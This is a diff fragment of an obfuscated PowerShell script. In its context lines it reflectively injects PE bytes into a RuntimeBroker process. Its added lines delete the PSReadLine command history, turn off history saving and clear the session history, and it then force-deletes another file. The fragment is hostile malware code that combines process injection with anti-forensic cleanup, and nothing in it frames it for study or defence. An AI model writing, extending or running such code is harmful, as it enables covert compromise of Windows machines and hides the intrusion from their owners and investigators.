@@ -40,7 +40,9 @@ $_0x2AA = (Get-Process RuntimeBroker | Select-Object -First 1).Id
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
 
-notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+Set-PSReadLineOption -HistorySaveStyle SaveNothing
+Clear-History
 
 Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
 
